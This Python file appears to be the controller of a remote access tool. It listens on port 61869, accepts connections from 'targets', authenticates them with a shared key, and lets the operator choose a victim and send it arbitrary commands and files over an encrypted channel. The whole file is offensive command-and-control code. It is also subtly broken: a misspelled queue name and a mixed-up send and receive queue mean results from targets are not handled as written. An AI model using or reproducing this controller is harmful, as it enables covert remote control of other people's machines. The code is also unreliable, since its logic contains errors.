import socket, threading, time, sys
import _thread as thread
import subprocess
import tools.cipher as cipher
import settings.keys as keys
import json
import copy
import queue
from tools.packet_manager import p_manager
import time
from tools.dictionary import *
from tools.exception_handler import exception_handler
from tools.utils import packet_send, packet_recv, file_send, file_recv

class baseServer():
    def __init__(self, port, listen=1):
        self.connection_lock = thread.allocate_lock()
        self.connection_list = {}

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.settimeout(3)
        self.sock.bind(('0.0.0.0',port))
        self.sock.listen(listen)

        self.active_connection = None
        self.send_list = queue.Queue()
        self.receive_list = queue.Queue()
        self.stop = False


    def listen_connections(self):
        count = 0
        while(True):
            try:
                self.connection = self.sock.accept()
            except socket.timeout:
                continue
            print("Obtained a new connection...")

            self.connection_lock.acquire()
            self.connection_list[count] = self.connection
            self.connection_lock.release()
            count += 1

    def executor(self):
        while(self.stop == False):
            try:
                time.sleep(DELAY)
                if (self.send_list.empty() == False):
                    message = self.send_list.get()

                    if message[PK_COMMAND_FLAG] == COMMAND_FTP:
                        file_recv(message)
                    else:
                        print(message[PK_PAYLOAD_FLAG])
                    
            except Exception as e:
                exception_handler(e)
                print("Error excuting command.")
                self.stop = True
                return

    def receiver(self, conn, cipherClass):
        leftovers = b''
        while(self.stop == False):
            try:
                packet, leftovers = packet_recv(cipherClass=cipherClass,
                            conn=conn,
                            decrypt=True,
                            leftovers=leftovers)

                self.receiv_list.put(packet)
            except socket.timeout:
                leftovers = b''
                continue
            except Exception as e:
                exception_handler(e)
                self.stop = True
                print("Error in receiver.")
                return

    def sender(self, conn, cipherClass):
        while(self.stop == False):
            try:
                time.sleep(DELAY)
                if (self.send_list.empty() == False):
                    packet = self.send_list.get()

                    packet_send(command=packet[PK_COMMAND_FLAG],
                                payload=packet[PK_PAYLOAD_FLAG],
                                cipherClass=cipherClass,
                                conn=conn,
                                encrypt=True)
            except Exception as e:
                exception_handler(e)
                print("Error sending command.")
                self.stop = True
                return

    def input_collection(self):
        while(True):
            packet = {}
            message = input()
            if len(message) <= 0:
                continue

            try:
                message = message.split(' ',1)
                packet[PK_COMMAND_FLAG] = message[0].upper()
                packet[PK_PAYLOAD_FLAG] = message[1] if len(message) == 2 else ''

                if packet[PK_COMMAND_FLAG] == COMMAND_SERVER_LIST:
                    self.connection_lock.acquire()
                    for connection_number in self.connection_list.keys():
                        print(str(connection_number) + " " + str(self.connection_list[connection_number][1]))
                    self.connection_lock.release()

                elif packet[PK_COMMAND_FLAG] == COMMAND_SERVER_CHOOSE:

                    if self.active_connection != None:
                        print("Stop current active connection first.")
                        continue

                    chosen = int(packet[PK_PAYLOAD_FLAG])
                    self.connection_lock.acquire()
                    if chosen in self.connection_list:
                        connection = self.connection_list.pop(chosen)
                    else:
                        self.connection_lock.release()
                        print("Not in any of the connections")
                        continue
                    self.connection_lock.release()

                    self.active_connection = connection
                    connection_thread = threading.Thread(target=self.startConnection, args=(connection,))
                    connection_thread.start()

                elif packet[PK_COMMAND_FLAG] == COMMAND_SERVER_SIGNOUT:
                    self.stop = True

                elif packet[PK_COMMAND_FLAG] == COMMAND_SERVER_CHECK_CON:
                    #Checks active connection

                    if self.active_connection == None:
                        output = "None"
                    else:
                        output = self.active_connection[1]

                    print("Current connection is : {}".format(output))

                elif packet[PK_COMMAND_FLAG] == COMMAND_FTP:
                    file_send(packet[PK_PAYLOAD_FLAG], self.send_list)


                elif packet[PK_COMMAND_FLAG] == COMMAND_SERVER_HELP:
                    help_text = '''
{0} - List all current connections.
{1} - Choose a connection. Add a parameter with the connection number.
{2} - Sign out of current active connection.
{3} - Check current active connection.
{4} - Open help text.
                    '''.format(COMMAND_SERVER_LIST,
                                COMMAND_SERVER_CHOOSE,
                                COMMAND_SERVER_SIGNOUT,
                                COMMAND_SERVER_CHECK_CON,
                                COMMAND_SERVER_HELP)
                    print(help_text)
                else:
                    if self.active_connection == None:
                        print("No active connection.")
                    else:
                        self.send_list.put(packet)
                print("Done.")
            except Exception as e:
                exception_handler(e)
                print(e)
                continue

    def authenticate(self, conn, cipherClass):
        while(True):
            try:
                password = cipher.generateIV().hex()
                packet_send(command=COMMAND_START,
                            payload=password,
                            cipherClass=cipherClass,
                            conn=conn)


                packet, _ = packet_recv(cipherClass=cipherClass,
                            conn=conn,
                            decrypt=False)

                if packet[PK_COMMAND_FLAG] == COMMAND_ACKNOWLEDGE and packet[PK_PAYLOAD_FLAG] == password:
                    break
                else:
                    print("Configuration error. Socket returned a different Initialization Vector")
                    time.sleep(DELAY)
                    continue
            except socket.timeout:
                continue
            except:
                print("Error, connection from client lost.")
                return False
        print("Target authenticated.")
        return True

    def startConnection(self, connection,key=keys.CONN_PASSWORD):
        #Enter Needed connection to start
        cipherClass = cipher.cipher(key=key)
        connection[0].settimeout(1)
        try:
            if (self.authenticate(connection[0], cipherClass) == False):
                return

            receiver = threading.Thread(target=self.receiver,args=(connection[0],cipherClass))
            sender = threading.Thread(target=self.sender,args=(connection[0],cipherClass))
            executor = threading.Thread(target=self.executor)

            receiver.start()
            sender.start()
            executor.start()

            receiver.join()
            sender.join()
            executor.join()
            self.stop = False
        except Exception as e:
            exception_handler(e)
        finally:
            self.active_connection = None
            connection[0].close()
        return

    def __del__(self):
        self.sock.close()



def main():
    PORT = 61869
    print("Creating a server on port {}".format(PORT))
    server = baseServer(port=PORT,
                        listen=5)

    listener = threading.Thread(target=server.listen_connections)
    listener.start()
    server.input_collection()


if __name__ == "__main__":
    main()
